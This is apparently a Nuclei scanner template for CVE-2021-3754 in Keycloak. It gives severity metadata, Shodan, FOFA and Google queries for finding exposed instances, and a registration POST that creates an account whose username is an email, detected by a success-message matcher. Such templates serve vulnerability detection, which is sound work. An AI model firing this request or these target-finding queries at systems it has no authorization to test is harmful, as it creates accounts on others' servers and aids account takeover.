id: CVE-2021-3754

info:
  name: Keycloak Username Registration Vulnerability
  author: ProjectDiscoveryAI
  severity: medium
  description: A flaw in Keycloak allows an attacker to register with a username identical to the email ID of an existing user, potentially causing issues with password recovery.
  impact: |
    Successful exploitation could lead to unauthorized access and potential account takeover.
  remediation: |
    Apply the patch provided by Keycloak to mitigate CVE-2021-3754.
  reference:
    - https://github.com/7Ragnarok7/CVE-2021-3754
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:L
    cvss-score: 5.3
    cve-id: CVE-2021-3754
    cwe-id: CWE-20,NVD-CWE-noinfo
    epss-score: 0.00089
    epss-percentile: 0.39769
    cpe: cpe:2.3:a:redhat:keycloak:-:*:*:*:*:*:*:*
  metadata:
    vendor: redhat
    product: keycloak
    shodan-query: http.favicon.hash:-1105083093
    fofa-query:
      - body="keycloak"
      - icon_hash="-1105083093"
      - title="keycloak"
    google-query: intitle:"keycloak"

http:
  - method: POST
    path:
      - "{{BaseURL}}/auth/realms/master/protocol/openid-connect/registrations"

    body: "username={{email}}&email={{email}}&password={{randstr}}&password-confirm={{randstr}}"

    headers:
      Content-Type: "application/x-www-form-urlencoded"
    matchers:
      - type: word
        words:
          - "Your new account has been created"
        part: body
